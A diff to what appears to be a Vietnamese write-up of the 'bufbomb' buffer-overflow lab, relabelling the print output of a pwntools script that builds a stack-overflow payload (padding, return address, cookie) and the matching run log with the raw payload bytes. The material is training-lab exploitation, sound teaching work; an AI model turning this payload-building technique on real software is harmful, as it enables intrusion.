@@ -83,7 +83,7 @@ cookie_getter = process(['./makecookie', '09821978'])
 # lưu giá trị cookie
 cookie = cookie_getter.recvline()[2:-1]
 cookie = int(cookie, 16)
-print(hex(cookie))
+print(f"cookie: {hex(cookie)}")
 
 e = ELF('./bufbomb')
 
@@ -97,7 +97,7 @@ exploit_payload += b'A'*4
 # chèn giá trị cookie vào payload
 exploit_payload += p32(cookie)
 
-print(exploit_payload)
+print(f"exploit payload: {exploit_payload}")
 
 with open('payload.txt', 'wb') as f:
     f.write(exploit_payload)
@@ -137,8 +137,8 @@ Chạy script.
 [+] Starting local process './bufbomb': pid 29
 [+] Starting local process './makecookie': pid 31
 [*] Process './makecookie' stopped with exit code 0 (pid 31)
-0x31f21393
-b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x18\x9b\x13\x80AAAA\x93\x13\xf21'
+cookie: 0x31f21393
+exploit payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x18\x9b\x13\x80AAAA\x93\x13\xf21'
 [*] Switching to interactive mode
 [*] Process './bufbomb' stopped with exit code 0 (pid 29)
 Userid: 09821978
